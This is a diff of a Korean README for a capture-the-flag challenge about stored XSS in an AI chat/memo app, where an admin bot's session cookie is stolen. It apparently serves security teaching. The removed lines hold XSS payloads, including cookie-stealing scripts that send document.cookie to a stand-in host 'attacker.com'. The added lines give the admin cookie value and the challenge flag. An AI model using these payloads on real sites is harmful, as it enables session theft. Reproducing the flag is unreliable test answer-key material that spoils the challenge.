@@ -57,36 +57,34 @@
 <br>
 
 ## 💥 공격 흐름 예시
-### 1. 공격 기법
 
+## 1. 공격 기법
 | 기법 | 설명 |
 |-----------|------|
-| `<script>` 삽입 | `<script>alert(1)</script>` 형태로 기본적인 XSS 실행                               |
-| 쿠키 탈취         | `<script>location.href='http://attacker.com?c='+document.cookie</script>` |
-| 이미지 오류 이벤트    | `<img src=x onerror=alert('XSS')>`                                        |
-| HTML 엔티티 우회   | `&lt;script&gt;alert(1)&lt;/script&gt;`                                   |
-| DOM 조작        | `<script>document.body.innerHTML='hacked'</script>`                       |
+| 악성 스크립트 삽입 | `<script>sendToServer(document.cookie)</script>` 형태로 메모 작성 후 등록 |
+| 쿠키 탈취 | AI가 응답 메시지를 생성하고 메모가 목록에 저장됨 |
+| 관리자 브라우저 로딩 | J대리가 브라우저에서 메모 목록 확인 (자동 시뮬레이션) |
+| 쿠키 전송 | HTML 내에 포함된 스크립트가 실행되어 document.cookie 전송됨 |
+| 인증 우회 | 탈취된 관리자 쿠키 `admin_session=j대리_secret_cookie_12345` 사용 |
 
-### 2. 동작 흐름
-
+## 2. 동작 흐름
 | 단계 | 설명 |
 |-----------|------|
-| 1  | 사용자가 메시지를 입력하면 `conversation_history`에 저장됨                                            |
-| 2  | `ctf05_LLM_ask()` 함수가 GPT-3.5-turbo를 호출해 응답 생성                                        |
-| 3  | `ctf05_generate_share_html()` 함수가 대화 내역을 HTML 파일로 변환함. 이때 사용자 입력이 escape되지 않고 그대로 삽입됨 |
-| 4  | `ctf05_admin_bot_visit()` 함수가 관리자의 HTML 열람을 헤드리스 브라우저로 시뮬레이션함                         |
-| 5  | 악의적 JavaScript가 실행되어 `document.cookie`를 통해 쿠키가 탈취됨 |
+| 1 | 사용자가 메모에 악성 스크립트를 삽입하여 등록 |
+| 2 | AI가 응답을 생성하고 스크립트가 포함된 메모가 저장됨 |
+| 3 | 관리자(J대리)가 브라우저로 메모 목록을 확인 (자동화된 시뮬레이션) |
+| 4 | HTML에 삽입된 악성 스크립트가 관리자 브라우저에서 실행됨 |
+| 5 | `document.cookie`를 통해 관리자 세션 쿠키가 탈취됨 |
+| 6 | 탈취한 쿠키로 인증하여 플래그 획득: `flag{jeonminju_86}` |
 
-### 3. 위협 요소 및 대응 방안
-
+## 3. 위협 요소 및 대응 방안
 | 위협 | 설명 | 대응 |
 |-----------|------|------|
-| 세션 쿠키 탈취         | 관리자 인증 우회 가능     | `HttpOnly`, `Secure` 속성 사용      |
-| 관리자 권한 탈취        | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩              |
-| JavaScript 임의 실행 | 악성 행위 유도         | CSP(Content Security Policy) 적용 |
+| 세션 쿠키 탈취 | 관리자 인증 정보 노출 | `HttpOnly`, `Secure` 속성 사용 |
+| 관리자 권한 탈취 | 민감 정보 접근, 시스템 조작 | 사용자 입력 검증 및 출력 인코딩 |
+| JavaScript 임의 실행 | 악성 행위 유도 | CSP(Content Security Policy) 적용 |
 
-### 4. 보안 권장 사항
-
+## 4. 보안 권장 사항
 * 사용자 입력은 반드시 출력 전 `html.escape()` 처리 또는 Jinja2 autoescape 기능 사용
 * CSP 적용을 통해 인라인 및 외부 스크립트 제한
 * 모든 사용자 입력에 대한 서버 측 필터링 적용
@@ -95,13 +93,13 @@
 <br>
 
 ## ✅ 테스트 케이스 예시
-
 | 입력 | 기대 응답 |
 |-----|-----|
-| `안녕하세요`                                                          | 정상 HTML 생성, XSS 없음  |
-| `<script>alert(1)</script>`                                      | 관리자 브라우저에서 alert 실행 |
-| `<img src=x onerror=alert('XSS')>`                               | 관리자 브라우저에서 alert 실행 |
-| `<script>fetch('http://attacker.com?'+document.cookie)</script>` | 쿠키 탈취 가능            |
+| `오늘도 고생했어` | 🤖 긍정적인 응원 메시지 |
+| `<script>alert(1)</script>` | ❌ 아무 일도 일어나지 않음 (단순 alert) |
+| `<script>sendToServer(document.cookie)</script>` | ✅ 쿠키 탈취 성공 → 인증 시 flag 노출 |
+| `admin_session=j대리_secret_cookie_12345` | ✅ 최종 플래그: `flag{jeonminju_86}` |
+| `admin_session=wrong_cookie_123` | ❌ 잘못된 쿠키 정보입니다 |
 
 <br>
 
